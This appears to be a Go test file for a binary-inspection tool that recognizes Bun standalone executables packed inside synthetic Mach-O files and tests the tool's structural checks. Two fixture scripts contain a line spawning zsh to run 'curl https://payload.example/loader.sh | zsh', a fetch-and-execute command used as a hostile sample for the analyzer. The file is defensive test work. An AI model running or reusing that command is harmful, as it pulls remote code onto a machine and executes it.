package artifact

import (
	"bytes"
	"encoding/binary"
	"reflect"
	"strings"
	"testing"
)

func TestRecognizeBunStandaloneThinRequiresExactStructure(t *testing.T) {
	source := []byte(bunStandaloneEntryHeader + `import { spawnSync } from "child_process";` + "\n" +
		`spawnSync("/bin/zsh", ["-c", "curl https://payload.example/loader.sh | zsh"]);` + "\n")
	data := testBunStandaloneMachO(t, "/$bunfs/root/helper", source)

	entry, ok := recognizeBunStandaloneThin(data)
	if !ok {
		t.Fatal("valid Bun standalone representation was not recognized")
	}
	if entry.embeddedPath != "/$bunfs/root/helper" || !bytes.Equal(entry.source, source) {
		t.Fatalf("entry = %#v", entry)
	}
	if len(entry.evidence) != 4 || entry.evidence[0].Offset != testBunMachOSectionOffset ||
		entry.evidence[1].Value != "/$bunfs/root/helper" || entry.evidence[2].Offset != entry.sourceOffset {
		t.Fatalf("recognition evidence = %#v", entry.evidence)
	}

	tests := []struct {
		name   string
		mutate func([]byte)
	}{
		{
			name: "declared payload length",
			mutate: func(data []byte) {
				binary.LittleEndian.PutUint64(data[testBunMachOSectionOffset:], 1)
			},
		},
		{
			name: "embedded path prefix",
			mutate: func(data []byte) {
				copy(data[testBunMachOSectionOffset+8:], "/tmp/not-bun/")
			},
		},
		{
			name: "entry header",
			mutate: func(data []byte) {
				offset := testBunMachOSectionOffset + 8 + len("/$bunfs/root/helper") + 1
				data[offset] = 'x'
			},
		},
		{
			name: "footer",
			mutate: func(data []byte) {
				data[len(data)-1] = 'x'
			},
		},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			malformed := bytes.Clone(data)
			test.mutate(malformed)
			if entry, ok := recognizeBunStandaloneThin(malformed); ok {
				t.Fatalf("malformed representation recognized: %#v", entry)
			}
		})
	}
}

func TestRecognizeBunStandaloneThinRequiresMachOPreflight(t *testing.T) {
	data := testBunStandaloneMachO(t, "/$bunfs/root/helper", []byte(bunStandaloneEntryHeader+"console.log('fixture');\n"))

	// Keep the Bun section bytes and header individually parseable while making
	// the section extend outside its owning segment's declared file mapping.
	// Hostile-input facade recognition must never reach the standard parser
	// without the stricter structural preflight.
	binary.LittleEndian.PutUint64(data[32+48:32+56], 1)
	if _, _, err := PreflightMachOSlices(data); err == nil {
		t.Fatal("malformed segment mapping passed Mach-O preflight")
	}
	if entry, ok := recognizeBunStandaloneThin(data); ok {
		t.Fatalf("preflight-rejected Mach-O was recognized as Bun: %#v", entry)
	}
}

func TestInspectBytesRecoversBunEntrypointAndLoaderRelationship(t *testing.T) {
	source := []byte(bunStandaloneEntryHeader + `import { spawnSync } from "child_process";` + "\n" +
		`spawnSync("/bin/zsh", ["-c", "curl -fsSL https://payload.example/loader.sh | zsh"]);` + "\n")
	data := testBunStandaloneMachO(t, "/$bunfs/root/helper", source)

	first, err := InspectBytes("renamed.bin", data, Options{})
	if err != nil {
		t.Fatal(err)
	}
	second, err := InspectBytes("renamed.bin", data, Options{})
	if err != nil {
		t.Fatal(err)
	}
	if !reflect.DeepEqual(first, second) {
		t.Fatal("Bun standalone inspection is not deterministic")
	}
	if len(first.Graph.Nodes) != 2 {
		t.Fatalf("nodes = %#v", first.Graph.Nodes)
	}
	carrier, child := first.Graph.Nodes[0], first.Graph.Nodes[1]
	if carrier.Kind != "macho" || carrier.PackagingTechnology != "Bun" ||
		carrier.AnalyzeStatus != "partial" || !strings.Contains(carrier.CoverageDetail, "module/asset metadata") {
		t.Fatalf("carrier = %#v", carrier)
	}
	if child.ParentID != carrier.ID || child.Kind != "script" || child.Provenance != "bun-standalone-entry" ||
		child.SourceRole != "runtime" || child.LogicalPath != "renamed.bin!_bun/entry.js" {
		t.Fatalf("child = %#v", child)
	}
	if len(first.Contents) != 2 || !bytes.Equal(first.Contents[1].Data, source) {
		t.Fatalf("contents = %#v", first.Contents)
	}
	var loader Edge
	for _, edge := range first.Graph.Edges {
		if edge.Kind == "loader-invokes" {
			loader = edge
		}
	}
	if loader.From != carrier.ID || loader.To != child.ID || loader.Ordinal == nil || *loader.Ordinal != 0 ||
		len(loader.SupportingEvidence) != 4 {
		t.Fatalf("loader edge = %#v", loader)
	}
}

func TestInspectBytesBunRecognitionSurvivesDisabledExpansion(t *testing.T) {
	source := []byte(bunStandaloneEntryHeader + "console.log('fixture');\n")
	data := testBunStandaloneMachO(t, "/$bunfs/root/fixture", source)

	result, err := InspectBytes("fixture", data, Options{DisableContainerExpansion: true})
	if err != nil {
		t.Fatal(err)
	}
	if len(result.Graph.Nodes) != 1 || result.Graph.Nodes[0].PackagingTechnology != "Bun" ||
		result.Graph.Nodes[0].AnalyzeStatus != "partial" ||
		!strings.Contains(result.Graph.Nodes[0].CoverageDetail, "entry extraction skipped") {
		t.Fatalf("disabled expansion result = %#v", result.Graph.Nodes)
	}
	for _, edge := range result.Graph.Edges {
		if edge.Kind == "loader-invokes" {
			t.Fatalf("disabled expansion created loader target: %#v", result.Graph.Edges)
		}
	}
}

const testBunMachOSectionOffset = 32 + 72 + 80

func testBunStandaloneMachO(t *testing.T, embeddedPath string, source []byte) []byte {
	t.Helper()
	section := make([]byte, 8, 8+len(embeddedPath)+len(source)+64)
	section = append(section, embeddedPath...)
	section = append(section, 0)
	section = append(section, source...)
	section = append(section, 0)
	section = append(section, make([]byte, 24)...)
	section = append(section, bunStandaloneFooter...)
	binary.LittleEndian.PutUint64(section[:8], uint64(len(section)-8))

	var out bytes.Buffer
	write := func(value any) {
		t.Helper()
		if err := binary.Write(&out, binary.LittleEndian, value); err != nil {
			t.Fatal(err)
		}
	}
	write(uint32(0xfeedfacf))
	write(uint32(0x0100000c))
	write(uint32(0))
	write(uint32(2))
	write(uint32(1))
	write(uint32(72 + 80))
	write(uint32(0x200000))
	write(uint32(0))

	write(uint32(0x19))
	write(uint32(72 + 80))
	write(testBunFixedName(bunStandaloneSegment))
	write(uint64(0x1000))
	write(uint64(len(section)))
	write(uint64(testBunMachOSectionOffset))
	write(uint64(len(section)))
	write(uint32(3))
	write(uint32(3))
	write(uint32(1))
	write(uint32(0))

	write(testBunFixedName(bunStandaloneSection))
	write(testBunFixedName(bunStandaloneSegment))
	write(uint64(0x1000))
	write(uint64(len(section)))
	write(uint32(testBunMachOSectionOffset))
	write(uint32(0))
	write(uint32(0))
	write(uint32(0))
	write(uint32(0x10000000))
	write(uint32(0))
	write(uint32(0))
	write(uint32(0))
	if out.Len() != testBunMachOSectionOffset {
		t.Fatalf("Mach-O header size = %d", out.Len())
	}
	out.Write(section)
	return out.Bytes()
}

func testBunFixedName(value string) [16]byte {
	var out [16]byte
	copy(out[:], value)
	return out
}
